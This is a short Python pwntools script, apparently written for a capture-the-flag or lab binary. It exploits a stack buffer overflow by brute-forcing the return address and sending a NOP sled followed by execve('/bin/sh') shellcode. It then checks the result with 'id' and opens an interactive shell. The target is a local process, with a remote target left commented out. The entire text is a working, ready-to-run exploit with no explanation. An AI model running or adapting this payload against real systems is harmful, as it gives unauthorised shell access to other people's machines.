from pwn import *
import time

eip = 0xffffd000

for i in range(0, 100):
    print hex(eip)
    payload = "A"*76 + p32(eip) + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    eip += 90
    r = process("./binary_name")
    #r = remote("remote_ip", port)
    r.sendline(payload)
    r.recv(1024)
    try:
        r.sendline("id")
        print r.recv(1024)
        time.sleep(0.1)
        r.interactive()
    except:
        pass 

